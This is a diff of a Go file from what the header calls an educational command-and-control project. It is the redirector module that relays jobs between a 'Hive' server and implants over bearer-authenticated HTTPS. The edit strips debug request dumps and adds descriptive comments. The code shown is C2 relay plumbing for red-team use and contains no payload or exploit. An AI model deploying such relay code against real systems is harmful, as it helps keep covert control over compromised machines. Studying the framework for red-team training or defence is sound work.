@@ -1,12 +1,6 @@
 //{{{{{{{ Redirector Hive Coms }}}}}}}
-
-//// Every Function that Hives use to Communicate with the Hive
-// A. hiveConnection
-// B. redChecking
-// C. hiveComs
-
-
 //By Rebujacker - Alvaro Folgado Rueda as an open source educative project
+
 package main
 
 import (
@@ -15,7 +9,6 @@ import (
     "crypto/tls"
     "encoding/json"
     "bytes"
-    "net/http/httputil"
     "strings"
     "io/ioutil"
 	"encoding/hex"
@@ -25,7 +18,14 @@ import (
 )
 
 
-
+/*
+Description: Main Redirector Routine to connect to Hive
+Flow:
+A.Activate lock to avoid multiple of this routine to be spawned
+B.Start connect routine to get Jobs towards this redirector from Hive
+C.Lock on memory slice from Existing Jobs to be sent to Hive,copy the slice and empty it
+D.Loop over the Jobs, and send them one by one to Hive
+*/
 func connectHive(){
 
 	lock.mux.Lock()
@@ -36,16 +36,12 @@ func connectHive(){
 	//Get Any Jobs from Bots targeting this redirector
 	getHive()
 	
-	//Debug: Ccheck Jobs to hive
-	fmt.Println("ConnectHive: Before Rlocking HiveJobs")
-	fmt.Println(jobsToHive.Jobs)
 
 	jobsToHive.mux.Lock()
 	tempJobs := jobsToHive.Jobs
 	jobsToHive.Jobs = jobsToHive.Jobs[:0]
 	jobsToHive.mux.Unlock()
 	
-	fmt.Println("ConnectHive: After Rlocking,start sending jobs...")
 	for i,_ := range tempJobs {
 		postHive(tempJobs[i])
 	}
@@ -58,6 +54,14 @@ func unlock(){
 	lock.mux.Unlock()
 }
 
+
+/*
+Description: Craft a GET request against Hive to retrieve Jobs that will be delivered to connected Implants
+Flow:
+A.Check Hive TLS signature before connection
+B.Configure http client and GET request
+C.Lock on memory slice, and append Jobs from Hive
+*/
 func getHive(){
 
 	var newJobs []*Job
@@ -108,16 +112,14 @@ func getHive(){
     jobsToBichito.Jobs = append(jobsToBichito.Jobs,newJobs...)
     jobsToBichito.mux.Unlock()
 
-	//Debug: Hive Get Request
-	requestDump, err2 := httputil.DumpRequest(req, true)
-	if err2 != nil {
-  		fmt.Println(err2.Error())
-	}
-	fmt.Println(string(requestDump))
-
 }
 
-
+/*
+Description: Craft a POST request against Hive to send a Job from an Implant
+Flow:
+A.Check Hive TLS signature before connection
+B.Configure http client and POST request
+*/
 func postHive(job *Job){
 
 
@@ -155,29 +157,17 @@ func postHive(job *Job){
 	req, _ := http.NewRequest("POST", "https://"+redconfig.Roaster+"/red",bytesRepresentation)
 	req.Header.Set("Authorization", authbearer)
 	
-	//Debug
-	fmt.Println("Performing POST to hive")
 	_, err := client.Do(req)
 	if err != nil {
 		fmt.Println(err.Error())
 		addLog("Post error"+err.Error())
 		return
 	}
-
-	
-	//Debug: Hive Post Request
-	requestDump, err2 := httputil.DumpRequest(req, true)
-	if err2 != nil {
-  		fmt.Println(err)
-	}
-	fmt.Println(string(requestDump))
-    //fmt.Println("Body: "+bytesRepresentation.String())
-    
-
-
 }
 
-
+/*
+Description: Craft a GET request against Hive to perform this redirector checking
+*/
 func checking() string{
 
 	result := checkTLSignature()
@@ -216,15 +206,8 @@ func checking() string{
 	if err2 != nil {
 		return "Bad CHecking Body Decoding"
 	}
-	//Debug CHecking
-	requestDump, err2 := httputil.DumpResponse(res, true)
-	if err2 != nil {
-  		fmt.Println(err2)
-	}
-	fmt.Println(string(requestDump))
-
+	
 	return string(body)
-
 }
 
 
